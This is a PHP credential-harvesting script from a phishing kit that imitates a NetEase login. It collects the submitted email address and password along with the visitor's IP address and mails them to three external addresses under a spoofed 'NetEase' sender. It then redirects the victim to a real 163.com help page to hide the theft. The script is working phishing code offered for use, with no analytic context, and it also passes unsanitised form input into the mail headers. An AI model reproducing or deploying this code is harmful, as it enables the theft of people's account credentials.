<?   

$ip = getenv("REMOTE_ADDR");
$message .= "Email Address : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "------------------ Created By bastard --------------------\n";

$send = "willy24coal@gmail.com,topnight01@live.com,cucu.datuk@yahoo.com";
$subject = "NetEase";
$headers = "From: NetEase<logs@126.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://help.3g.163.com/");
	  

?>